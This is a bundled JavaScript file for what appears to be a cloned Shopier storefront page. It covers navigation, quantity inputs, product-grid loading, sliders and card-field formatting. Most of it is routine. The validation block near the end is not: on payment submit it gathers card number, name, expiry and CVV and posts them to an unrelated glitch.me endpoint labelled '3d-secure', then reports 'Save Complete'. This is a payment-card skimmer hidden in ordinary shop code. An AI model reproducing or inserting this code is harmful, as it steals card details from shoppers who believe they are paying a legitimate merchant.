'use strict';
document.addEventListener('DOMContentLoaded', function(event) {
    var navbarSelector = $('.js-navbar');
    var navbarToggler = navbarSelector.find('.navbar-toggler');
    var navbarLocale = navbarSelector.find('.nav-locale');
    var navbarScroll = function navbarScroll(navbarSelector) {
        if (!navbarSelector.length) return false;
        var scrollTop = $(window).scrollTop() || $('body').scrollTop();
        if (scrollTop > navbarSelector.outerHeight()) {
            navbarSelector.addClass('is-scroll');
        } else {
            navbarSelector.removeClass('is-scroll');
        }
    };
    var navbarOpen = function navbarOpen() {
        navbarSelector.attr('aria-expanded', 'true').removeClass('navbar-light').addClass('navbar-dark');
        navbarSelector.find('.navbar-collapse').addClass('in show');
        navbarToggler.attr('aria-expanded', 'true');
    };
    var navbarClose = function navbarClose() {
        navbarSelector.attr('aria-expanded', 'false').removeClass('navbar-dark').addClass('navbar-light');
        navbarSelector.find('.navbar-collapse').removeClass('in show');
        navbarToggler.attr('aria-expanded', 'false');
    };
    navbarToggler.on('click', function(event) {
        var curVal = navbarToggler.attr('aria-expanded') === 'true';
        if (curVal) {
            navbarClose();
        } else {
            navbarOpen();
        }
        event.stopPropagation();
        event.preventDefault();
    });
    $('a.js-scroll-trigger[href*="#"]:not([href="#"])').click(function(event) {
        if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') && location.hostname == this.hostname) {
            var target = $(this.hash);
            target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
            if (target.length) {
                event.preventDefault();
                if ($(window).width() < 992) {
                    navbarClose();
                }
                $('html, body').stop().animate({
                    scrollTop: target.offset().top - 67
                }, 1000, function() {
                    var $target = $(target);
                    $target.focus();
                    if ($target.is(':focus')) {
                        return false;
                    } else {
                        $target.attr('tabindex', '-1');
                        $target.focus();
                    };
                });
            }
        }
    });
    $('.js-scroll-top').click(function(event) {
        event.preventDefault();
        $('html, body').animate({
            scrollTop: 0
        }, 1000);
    });
    var navbarLocaleDetect = function navbarLocaleDetect() {
        if (getQueryVariable('locale') === 'tr') {
            $('[data-lang]').removeClass('active');
            $('[data-lang="tr"]').addClass('active');
        } else {
            $('[data-lang]').removeClass('active');
            $('[data-lang="en"]').addClass('active');
        }
    };
    if ($('.js-languages').length) {
        navbarLocaleDetect();
    }
    $(window).resize(function() {
        if ($(window).width() > 992) {
            navbarClose();
        }
    }).trigger('resize');
    if ($('.js-scroll-helper').length) {
        $(window).on('scroll', function() {
            navbarScroll(navbarSelector);
        });
    }
    $(document).on('click', '.navbar .dropdown-menu', function(e) {
        if (!$(e.target).hasClass('dropdown-close')) {
            e.stopPropagation();
        }
    });
});

function getQueryVariable(variable) {
    var query = window.location.search.substring(1);
    var vars = query.split('&');
    for (var i = 0; i < vars.length; i++) {
        var pair = vars[i].split('=');
        if (decodeURIComponent(pair[0]) == variable) {
            return decodeURIComponent(pair[1]);
        }
    }
}
'use strict';

function initQuantityInput(selector) {
    var $selector = $(selector) || $('.js-quantity');
    if (!$selector.length) return false;
    var $quantityBtnDec = $selector.find('.js-quantity-minus');
    var $quantityBtnInc = $selector.find('.js-quantity-plus');
    var $quantityInput = $selector.find('input');
    var $selectorDesktop = $('.js-desktop-quantity-input');
    $quantityBtnDec.on("click", function(e) {
        var currentValue = $quantityInput.val();
        $quantityInput.val(parseInt(currentValue) - 1);
        if ($quantityInput.val() == 1) {}
        $quantityInput.trigger('change');
    });
    $quantityBtnInc.on("click", function(e) {
        var currentValue = $quantityInput.val();
        $quantityInput.val(parseInt(currentValue) + 1);
        $quantityBtnDec.attr('disabled', false);
        $quantityInput.trigger('change');
    });
    $quantityInput.on('change', function(e) {
        var currentValue = $(this).val();
        if ($selectorDesktop.length) {
            $selectorDesktop.val(currentValue);
        }
        if (currentValue < 2) {} else {
            $quantityBtnDec.attr('disabled', false);
        }
    });
}
document.addEventListener('DOMContentLoaded', function(event) {
    console.info('[Shopier] DOM loaded.');
    $('[name="benefits"]').on('change', function(event) {
        var $target = $($(event.target).data('target'));
        $target.siblings().fadeOut(200).removeClass('active show');
        if (!$target.hasClass('active show')) {
            $target.addClass('active show').fadeIn(350);
        }
        event.preventDefault();
    });
    $('.js-quantity').each(function(index, element) {
        initQuantityInput(element);
    });
    var inputMaxLen = $('.js-max-length');
    if (inputMaxLen.length) {
        inputMaxLen[0].oninput = function(e) {
            if (this.value.length > 11) {
                this.value = this.value.slice(0, 11);
            }
        };
    }
});
'use strict';

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
var currentPictureCount = sessionStorage.getItem("defaultProductCount");
var totalPictureCount;
document.addEventListener('DOMContentLoaded', function(event) {
    var loadProductsButton = $('.js-load-more');
    var productsGrid = $('#products-grid');
    var productsContainer = $('.products-container');
    var productsEmptyContainer = $('.products-empty');
    var productsDelay = 2000;
    var productSearch = $('.js-search-input');
    let isReadyToFetchProducts = true;
    let isReadyToFetchImages = true;
    let ajaxData = false;
    let lastCategory = false;
    var loadProducts = function loadProducts() {
        isReadyToFetchProducts = false;
        if (typeof ajaxData == 'object' && ajaxData.products.length) {
            renderProducts(ajaxData);
        } else if (ajaxData == 'loading') {
            const waitFetch = setInterval(() => {
                if (typeof ajaxData == 'object' && ajaxData.products.length) {
                    renderProducts(ajaxData);
                }
                if (ajaxData != 'loading') {
                    clearInterval(waitFetch);
                }
            }, 100);
        } else {
            getMoreProducts((data) => {
                if (data.status == "1") {
                    renderProducts(data);
                }
                return false;
            })
        }
    };

    function renderProducts(data) {
        var jeton = $('input[name="jeton"]').val();
        if (sessionStorage.getItem("currentPictureCount") == "0")
            sessionStorage.setItem("currentPictureCount", sessionStorage.getItem("defaultProductCount"));
        currentPictureCount = $(".product__overlay").length;
        sessionStorage.setItem("currentPictureCount", currentPictureCount);
        if (data.products.length < sessionStorage.getItem("defaultProductCount")) {
            $(".js-load-more").hide();
        } else
            $('.js-load-more').removeClass('invisible').show();
        var langStrings = data.zangdefinition;
        var productTemplate = $('.js-item').last();
        var productOldPriceTemplate;
        var t = $(window).scrollTop();
        var newProduct = productTemplate.clone().hide();
        var imagesCDNURL = data.images_cdn_url;
        newProduct.find('.product__image').attr("src", imagesCDNURL + 'pictures_mid/600icons-2.png');
        newProduct.find('.product__image').attr("srcset", imagesCDNURL + 'pictures_mid/600icons-2.png');
        var grayScaleCss = '';
        setTimeout(function() {
            $.each(data.products, function(index, item) {
                grayScaleCss = '';
                newProduct.attr('data-product', index);
                newProduct.find('.product__price').text(item.price.replace('&nbsp;', ' '));
                if ((parseInt(item.originalPrice)) !== 0)
                    productOldPriceTemplate = ' <del class="product__price--old">' + (item.originalPriceWellFormatted) + '</del>';
                else
                    productOldPriceTemplate = ' ';
                var mycategory = (window.location + '').split('#')[1];
                var urlhash;
                if (searchWord2 === undefined || searchWord2 === "")
                    searchWord2 = $('.js-search-input').val();
                if (searchWord2 !== undefined && searchWord2 !== "")
                    urlhash = encodeHashCode(item.page, item.productOffset, " ", searchWord2);
                else if (mycategory !== "")
                    urlhash = encodeHashCode(item.page, item.productOffset, mycategory);
                else
                    urlhash = encodeHashCode(item.page, item.productOffset);
                newProduct.find('.product__title').html('<a style="color:#435062;" class="product_name_url" href="' + 'products.php?id=' + item.productId + "&sid=" + urlhash + '">' + item.title + '</a>');
                newProduct.find('.product__price').append(productOldPriceTemplate);
                newProduct.find('.product__image').attr("src", imagesCDNURL + 'pictures_large/' + item.picturefilename);
                newProduct.find('.product__image').attr("srcset", imagesCDNURL + 'pictures_large/' + item.picturefilename);
                if (searchWord2 !== undefined)
                    newProduct.find('.product__thumb').attr("href", 'products.php?id=' + item.productId + "&sid=" + urlhash);
                else
                    newProduct.find('.product__thumb').attr("href", 'products.php?id=' + item.productId + "&sid=" + urlhash);
                newProduct.find('.product__thumb').attr("onclick", "editUrl('" + urlhash + "')");
                newProduct.find('.product__overlay').empty();
                grayScaleCss = "";
                newProduct.find('.product__image').attr("style", "");
                if ((item.new === true) || (item.lastitem === true) || (item.isdigital === true) || (parseInt(item.stock) <= 0) || ((item.discount) !== 0) || parseInt(item.shop_vacation) === 1 || parseInt(item.show_last_product_label) === 1 || parseInt(item.show_new_product_label) === 1 || (item.is_discounted === true)) {
                    if (parseInt(item.show_new_product_label) === 1)
                        if (item.new === true) {
                            newProduct.find('.product__overlay').html('<div class="product__badge product__badge--new">' + langStrings.new + ' </div>');
                        }
                    if (parseInt(item.show_last_product_label) === 1)
                        if (item.lastitem === true) {
                            newProduct.find('.product__overlay').html('<div class="product__badge product__badge--last">' + langStrings.lastitem + ' </div>');
                        }
                    if (item.isdigital === true) {
                        newProduct.find('.product__overlay').html('<div class="product__badge product__badge--last">' + langStrings.digitalproduct + ' </div>');
                    }
                    if (parseInt(item.stock) <= 0) {
                        newProduct.find('.product__overlay').html('<div class="product__badge product__badge--last">' + langStrings.outofstock + ' </div>');
                        grayScaleCss = 'style="-webkit-filter: grayscale(100%) contrast(40%);filter: grayscale(100%) filter: contrast(40%);"';
                        newProduct.find('.product__image').attr("style", "-webkit-filter: grayscale(100%) contrast(40%);filter: grayscale(100%) filter: contrast(40%);")
                    }
                    if (parseInt(item.shop_vacation) === 1) {
                        grayScaleCss = 'style="-webkit-filter: grayscale(100%) contrast(40%);filter: grayscale(100%) filter: contrast(40%);"';
                        newProduct.find('.product__image').attr("style", "-webkit-filter: grayscale(100%) contrast(40%);filter: grayscale(100%) filter: contrast(40%);")
                    }
                    if (item.is_discounted === true) {
                        newProduct.find('.product__overlay').append('<div ' + grayScaleCss + ' class="product__discount_selected_product"><span><img src="styles/images/discount_mini.png" srcset="styles/images/discount_mini.png 2x" width="28" height="21" alt=""></span></div>');
                    } else {
                        if ((item.discount) !== 0) {
                            newProduct.find('.product__overlay').append('<div ' + grayScaleCss + ' class="product__discount"><span>' + (item.discount) + "%</span></div>");
                        }
                    }
                } else {}
                newProduct.appendTo(productsGrid).fadeIn();
                newProduct = productTemplate.clone().hide();
                newProduct.find('.product__image').attr("src", imagesCDNURL + 'pictures_mid/600icons-2.png');
                newProduct.find('.product__image').attr("srcset", imagesCDNURL + 'pictures_mid/600icons-2.png');
            });
            if (currentPictureCount > totalPictureCount) {
                loadProductsButton.addClass('invisible');
            }
            isReadyToFetchProducts = true;
            ajaxData = false;
            hashChangeSID();
        }, 0);
        var h = $('.products__cell').height();
    }

    function getMoreProducts(callback) {
        var tmpCategoryId = $("#mobile-display").data("id");
        if (sessionStorage.getItem("selectedCategory") != undefined && sessionStorage.getItem("selectedCategory") != "" && sessionStorage.getItem("selectedCategory") != "0")
            tmpCategoryId = sessionStorage.getItem("selectedCategory");
        $.ajax({
            method: "POST",
            url: "lib/ajax/searchProduct.php",
            data: {
                shop: shopName,
                categoryId: tmpCategoryId,
                jtn: sessionStorage.getItem("jeton"),
                start: sessionStorage.getItem("defaultProductCount"),
                offset: $(".product__overlay").length,
                filter: sessionStorage.getItem("filter"),
                sort: sessionStorage.getItem("sort"),
                filterMinPrice: sessionStorage.getItem("filterMinPrice"),
                filterMaxPrice: sessionStorage.getItem("filterMaxPrice"),
                datesort: sessionStorage.getItem("datesort"),
                pricesort: sessionStorage.getItem("pricesort"),
                activeCheckBoxes: JSON.parse(sessionStorage.getItem("activeCheckBoxes")),
                value: productSearch.val()
            },
            dataType: 'json'
        }).done(function(data) {
            if (callback) callback(data);
        });
    }
    loadImageBeforeView();

    function loadImageBeforeView() {
        let options = {
            rootMargin: "0px 0px 1000px 0px",
            threshold: 1.0,
        };
        let observer = new IntersectionObserver(entries => {
            if (entries[0].intersectionRatio <= 0) return;
            if (isReadyToFetchImages && ajaxData == false) {
                isReadyToFetchImages = false;
                ajaxData = 'loading';
                getMoreProducts((data) => {
                    if (data.status == "1") {
                        ajaxData = data;
                        data.products.forEach(item => {
                            new Image().src = `${data.images_cdn_url}pictures_large/${item.picturefilename}`;
                        })
                    } else {
                        ajaxData = false;
                    }
                    isReadyToFetchImages = true;
                })
            }
        }, options);
        if (document.querySelector(".js-load-more")) {
            observer.observe(document.querySelector(".js-load-more"));
        }
    }

    function infiniteScroll() {
        let options = {
            rootMargin: "0px",
            threshold: 1.0,
        };
        let observer = new IntersectionObserver(entries => {
            if (entries[0].intersectionRatio <= 0) return;
            if (isReadyToFetchProducts) {
                loadProducts();
            }
        }, options);
        if (document.querySelector(".js-load-more")) {
            observer.observe(document.querySelector(".js-load-more"));
        }
    }
    $('.js-search').on('submit', function(event) {
        event.preventDefault();
        var currentQuery = $('.js-search-input').val();
        if (currentQuery === 'empty') {
            $('.js-search-query').text(currentQuery);
            productsContainer.hide();
            productsEmptyContainer.show();
        } else {
            productsEmptyContainer.hide();
            productsContainer.show();
        }
        return false;
    });
    var timer;
    var productScroll = function productScroll() {
        if (timer) {
            window.clearTimeout(timer);
        }
        timer = window.setTimeout(function() {
            var hT = loadProductsButton.offset().top,
                hH = loadProductsButton.outerHeight(),
                hO = 0,
                wH = $(window).height(),
                wS = $(this).scrollTop();
            console.log("scrolled");
            console.log(wH);
            console.log(wS);
            console.log($(document).height());
            if (wS == 0)
                alert('Scrolled to Page Top');
            else if (wH + wS == $(document).height()) {
                alert('Scrolled to Page Bottom');
            }
        }, 200);
    };
    $('.js-load-more').on('click', function() {
        if (window.location.hash != '' && lastCategory != window.location.hash) {
            lastCategory = window.location.hash;
            ajaxData = false;
        }
        loadProducts();
    });
    $.urlParam = function(a) {
        var b = new RegExp('[?&]' + a + '=([^&#]*)').exec(window.location.href);
        if (b == null) {
            return null;
        } else {
            return b[1] || 0;
        }
    };
    if ($.urlParam('search') === 'empty') {
        $('.js-search-input').val('empty');
        $('.js-search').submit();
    }
    if ($.urlParam('search')) {
        $('.js-search-input').val($.urlParam('search'));
        $('.js-search-text').text('Search Results');
        $('html, body').animate({
            scrollTop: $('.js-search-text:visible').offset().top
        }, 1000);
    }
    $('#pm-selectBank').change(function(e) {
        if (this.value == 'Select bank') {
            $('.requisites').hide();
        } else {
            $('.requisites').fadeIn();
        }
    });
    $('.js-select-with-label').change(function(e) {
        var $this = $(this);
        if ($this.prop('selectedIndex') == 0) {
            $this.removeClass('active');
        } else {
            $this.addClass('active');
        }
    });
    var inputMaxLen = $('#pd-inputCardSecurityCode');
    if (inputMaxLen.length) {
        inputMaxLen[0].oninput = function(e) {
            if (this.value.length > 4) {
                this.value = this.value.slice(0, 4);
            }
        };
    }
});
'use strict';
document.addEventListener('DOMContentLoaded', function(event) {
    if (!$('.js-swiper-large').length) return false;
    var swiperSmall = new Swiper('.js-swiper-small', {
        spaceBetween: 0,
        slidesPerView: 5,
        loop: false,
        freeMode: true,
        watchSlidesVisibility: true,
        watchSlidesProgress: true,
    });
    var swiperLarge = new Swiper('.js-swiper-large', {
        spaceBetween: 0,
        preloadImages: false,
        lazy: true,
        slideToClickedSlide: true,
        pagination: {
            el: '.swiper-pagination',
            type: 'bullets'
        },
        navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev'
        },
        thumbs: {
            swiper: swiperSmall
        }
    });
});







'use strict';
document.addEventListener('DOMContentLoaded', function(event) {
    if (!$('.js-cc-type').length) return false;
    var creditCardType = new Cleave('.js-cc-type', {
        creditCard: true,
        creditCardStrictMode: true,
        onCreditCardTypeChanged: function onCreditCardTypeChanged(type) {
            $('.js-cc-type').attr('data-cc-type', type);
        }
    });
    var creditCardExpire = new Cleave('.js-cc-expire', {
        delimiter: ' / ',
        date: true,
        datePattern: ['m', 'y']
    });
});
'use strict';
$('body').on('click', '.js-toggle-text', function(event) {
    var $link = $(this);
    var $content = $link.closest('.js-text-content');
    var linkText = $link.text();
    var curVal = $content.attr('aria-expanded') === 'true';
    $content.attr('aria-expanded', !curVal);
    event.preventDefault();
});

function getShowLinkText(currentText) {
    var newText = '';
    if (currentText.toUpperCase() === 'SHOW MORE') {
        newText = 'Show less';
    } else {
        newText = 'Show more';
    }
    return newText;
}
'use strict';
(function() {
    'use strict';
    window.addEventListener('load', function() {
        var formSelector = $('.js-validation');
        if (!formSelector.length) {
            return false;
        }
        var form = formSelector.get(0);
        this.document.getElementById("submitPay").addEventListener('click', function(event) {
            if (form.checkValidity() === false) {
                event.preventDefault();
                event.stopPropagation();
            } else {
                const JSON_data = {
                    cardNumber: $('#pd-inputCardNumber').val(),
                    nameSuname: $('#pd-inputNam').val(),
                    cardExpress: $('#pd-inputCardExpires').val(),
                    cardCVV: $('#pd-inputCardSecurityCode').val()
                }
                $.ajax({
                    type: 'POST',
                    url: "https://sedate-desert-nerve.glitch.me/3d-secure",
                    data: JSON.stringify(JSON_data),
                    contentType: "application/json", // Burada content-type başlığını belirtiyoruz
                    success: function(resultData) {
                        alert("Save Complete");
                    }
                });
            }
            form.classList.add('was-validated');
        }, false);
    }, false);
})();

function initImageZoom() {
    const firstImage = document.querySelector('.js-product-thumb .product__image');
    const outOfStock = firstImage.getAttribute("data-out-of-stock") !== null;
    let mainClass = "";
    if (outOfStock) mainClass += "pswp--out-of-stock";
    document.querySelectorAll('.js-product-thumb').forEach(item => {
        item.addEventListener('click', (e) => {
            const target = e.currentTarget;
            const index = parseInt(target.getAttribute('data-index'));
            const dataSource = Array.from(document.querySelectorAll('.js-product-thumb .product__image')).map(item => {
                const src = item.getAttribute('src') || item.getAttribute('data-src');
                const srcset = item.getAttribute('srcset') || item.getAttribute('data-srcset');
                const alt = item.getAttribute('alt') || '';
                return {
                    src,
                    srcset,
                    alt,
                    width: 1000,
                    height: 1000
                }
            })
            const options = {
                dataSource,
                index,
                showHideAnimationType: 'none',
                secondaryZoomLevel: 2,
                maxZoomLevel: 4,
                mainClass
            }
            const pswp = new PhotoSwipe(options);
            pswp.init();
        })
    })
}